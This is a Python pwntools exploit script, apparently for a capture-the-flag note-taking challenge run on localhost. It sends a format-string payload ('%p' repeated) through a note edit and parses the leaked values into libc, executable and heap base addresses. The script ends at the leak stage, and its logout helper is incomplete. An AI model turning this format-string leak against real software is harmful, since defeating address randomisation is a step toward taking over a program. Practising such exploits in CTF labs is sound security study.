#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = exe.process()
    elif args.GDB:
        return gdb.debug(exe.process(), 
        gdbscript="""
        b *view_notes_impl
        continue
        """
        )
    else:
        r = remote("localhost", 1337)

    return r

def register(r, name):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Username: ", name)

def login(r, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"username: ", name)

def create_note(r, idx, content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendafter(b"Content: ", content)

def edit_note(r, idx, content):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"content: ", content)

def view_one(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

def view_all(r):
    r.sendlineafter(b"> ", b"4")

def logout(r):
    r.sendlineafter()


def main():
    r = conn()

    register(r, b"aa")
    login(r, b"aa")
    create_note(r,0,b"aa")
    edit_note(r,0,b"%p"*30)
    view_one(r,0)
    r.recvuntil(b": ")

    leaks = r.recvline().decode().strip().replace("0x",".0x").replace("(nil)",".(nil).").replace("..",".").split(".")

    print(leaks)

    linker_leak = int(leaks[21],16)
    heap_leak = int(leaks[5],16)
    exe_base_leak = int(leaks[6],16)

    print("Libc Base: " + hex(linker_leak - 0x213580))
    print("Exe Base: " + hex(exe_base_leak - 0x1476))
    print("Heap Leak: " + hex(heap_leak))

    r.interactive()

if __name__ == "__main__":
    main()